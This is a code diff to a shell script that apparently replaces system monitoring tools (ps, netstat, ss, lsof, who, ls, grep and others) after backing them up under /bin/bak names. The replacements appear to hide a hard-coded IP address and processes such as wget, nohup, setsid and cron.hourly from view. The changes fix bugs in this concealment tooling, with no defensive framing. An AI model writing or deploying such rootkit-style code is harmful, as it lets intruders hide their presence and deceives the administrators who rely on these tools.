@@ -10,7 +10,7 @@
 #
 
 IP="10.10.2.4"
-COMMANDS="ps top ss netstat lsof who w last cat ls grep egrep"
+COMMANDS="ps top ss netstat lsof who w last cat ls grep" # don't replace egrep, causes infinite recursion
 
 IP_ESCAPED=$(echo "$IP" | sed "s/\./\\\./g") # escape the '.'s in the IP for use with egrep
 PROCESSES="egrep|sleep|run-parts|cron\.hourly|/usr/sbin/CROND -n|gnano|nohup|setsid|wget|flock"
@@ -175,7 +175,7 @@ else
 		if [ -z "$command" ]; then
 			cecho error "Provided binary is an empty string, strange! Skipping..."
 		else
-			if which "$command"; then
+			if which "$command" &>/dev/null; then
 				command_path=$(which $command)
 
 				if [ -f "/bin/bak${command}" ]; then
@@ -196,9 +196,9 @@ else
 						fi
 					fi
 				fi
+			else
+				cecho warning "Binary '$command' doesn't exist, skipping"
 			fi
-		else
-			cecho warning "Binary '$command' doesn't exist, skipping"
 		fi
 	done
 
